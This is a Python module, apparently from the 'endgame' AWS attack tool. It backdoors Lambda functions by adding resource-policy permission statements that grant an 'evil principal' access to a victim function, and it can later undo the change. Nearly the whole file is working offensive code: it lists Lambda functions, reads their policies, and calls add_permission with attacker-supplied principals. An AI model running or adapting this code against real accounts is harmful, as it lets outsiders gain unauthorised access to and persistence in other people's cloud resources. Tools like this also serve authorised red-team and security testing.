import json
import logging
from abc import ABC
import boto3
import botocore
from botocore.exceptions import ClientError
from endgame.shared import constants
from endgame.exposure_via_resource_policies.common import ResourceType, ResourceTypes
from endgame.shared.policy_document import PolicyDocument
from endgame.shared.response_message import ResponseMessage
from endgame.shared.utils import get_sid_names_with_error_handling
from endgame.shared.list_resources_response import ListResourcesResponse
from endgame.shared.response_message import ResponseGetRbp

logger = logging.getLogger(__name__)


class LambdaFunction(ResourceType, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        self.service = "lambda"
        self.resource_type = "function"
        self.region = region
        self.current_account_id = current_account_id
        self.name = name
        super().__init__(name, self.resource_type, self.service, region, client, current_account_id)

    @property
    def arn(self) -> str:
        return f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.resource_type}:{self.name}"

    def _get_rbp(self) -> ResponseGetRbp:
        """Get the resource based policy for this resource and store it"""
        logger.debug("Getting resource policy for %s" % self.arn)
        # When there is no policy, let's return an empty policy to avoid breaking things
        policy = constants.get_empty_policy()
        try:
            response = self.client.get_policy(FunctionName=self.name)
            policy = json.loads(response.get("Policy"))
            success = True
        except self.client.exceptions.ResourceNotFoundException as error:
            logger.debug("The Policy does not exist. We will have to add it.")
            success = True
        except botocore.exceptions.ClientError as error:
            logger.critical(error)
            success = False
        policy_document = PolicyDocument(
            policy=policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        response = ResponseGetRbp(policy_document=policy_document, success=success)
        return response

    def set_rbp(self, evil_policy: dict) -> ResponseMessage:
        logger.debug("Setting resource policy for %s" % self.arn)
        new_policy_document = PolicyDocument(
            policy=evil_policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        new_policy_json = {
            "Version": "2012-10-17",
            "Statement": []
        }
        current_sids = get_sid_names_with_error_handling(self.original_policy)
        success = True
        try:
            for statement in new_policy_document.statements:
                if statement.sid not in current_sids:
                    self.client.add_permission(
                        FunctionName=self.name,
                        StatementId=statement.sid,
                        Action=statement.actions[0],
                        Principal=statement.aws_principals[0],
                    )
                    success = True
                new_policy_json["Statement"].append(json.loads(statement.__str__()))
            message = "success"
        except botocore.exceptions.ClientError as error:
            message = str(error)
            logger.critical(f"Operation was not successful for {self.service} {self.resource_type} "
                            f"{self.name}. %s" % error)
            success = False
        policy_document = self._get_rbp().policy_document
        response_message = ResponseMessage(message=message, operation="set_rbp", success=success, evil_principal="",
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=policy_document.json, resource_type=self.resource_type,
                                           resource_name=self.name, service=self.service)
        return response_message

    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Wraps client.remove_permission"""
        logger.debug(f"Removing {evil_principal} from {self.arn}")
        new_policy = constants.get_empty_policy()
        operation = "UNDO"
        message = "404: No backdoor statement found"
        success = True
        for statement in self.policy_document.statements:
            if statement.sid == constants.SID_SIGNATURE:
                if not dry_run:
                    try:
                        self.client.remove_permission(
                            FunctionName=self.name,
                            StatementId=statement.sid,
                        )
                        message = f"200: Removed backdoor statement from the resource policy attached to {self.arn}"
                        success = True
                    except botocore.exceptions.ClientError as error:
                        success = False
                        logger.critical(f"Operation was not successful for {self.service} {self.resource_type} "
                                        f"{self.name}. %s" % error)
            else:
                new_policy["Statement"].append(json.loads(statement.__str__()))
        response_message = ResponseMessage(message=message, operation=operation, success=success,
                                           evil_principal=evil_principal, victim_resource_arn=self.arn,
                                           original_policy=self.original_policy, updated_policy=new_policy,
                                           resource_type=self.resource_type, resource_name=self.name,
                                           service=self.service)
        return response_message


class LambdaFunctions(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "lambda"
        self.resource_type = "function"

    @property
    def resources(self) -> [ListResourcesResponse]:
        """Get a list of these resources"""
        resources = []

        paginator = self.client.get_paginator('list_functions')
        page_iterator = paginator.paginate()
        for page in page_iterator:
            functions = page["Functions"]
            for function in functions:
                name = function.get("FunctionName")
                arn = function.get("FunctionArn")
                list_resources_response = ListResourcesResponse(
                    service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                    resource_type=self.resource_type, name=name)
                resources.append(list_resources_response)
        return resources
